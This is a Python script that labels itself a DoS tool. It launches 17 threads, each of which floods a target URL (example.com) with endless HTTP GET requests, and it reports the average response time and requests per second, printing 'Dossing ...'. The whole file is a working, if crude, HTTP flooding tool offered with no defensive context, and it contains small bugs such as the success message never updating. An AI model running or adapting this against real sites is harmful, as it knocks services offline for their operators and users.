import requests 
import threading
import time



l = []
def current_mil_time():
    return round(time.time() * 1000 )

def current_sec_time():
    return round(time.time())


def count_req_per_min(time_took):
    t = current_sec_time()
    l.append({
        "time_took":time_took,
        "time_recv":t
    })
    # per minutes 
    """ for e in l:
        if current_sec_time() - e['time_recv'] >= 60:
            l.remove(e) """
            
    #  per seconds 
    for e in l:
        if current_sec_time() - e['time_recv'] >= 1:
            l.remove(e)

message= "Dossing ..."
def make_request(name ):
    while True:
        try:
            s = current_mil_time()
            r = requests.get("https://www.example.com/")
            t = current_mil_time() - s 
            # print("Response Code from Thread #{} : {}  ,time took  {} ".format(name,str(r.status_code) , t))
            count_req_per_min(t)
        except Exception as e : 
            message = "DoS Looks successfully Done ......"
 
       
threads = 16
i=0
while i<=threads: 
    s = threading.Thread(target=make_request , args=(i,))
    print(" Starting Thread #{}... ".format(i))
    s.start()
    i+=1
    
 
 
print("Calculating ......")   
time.sleep(10)
while len(l)>0:
    time.sleep(1)
    response_time = 0
    for e in l :
        response_time = response_time + e['time_took']
    response_time = response_time / len(l)
    print('\rAverage response time  :  {}ms  ; response / sec  : {} ; {};'.format(round(response_time,2), len(l) , message  ),end=" ")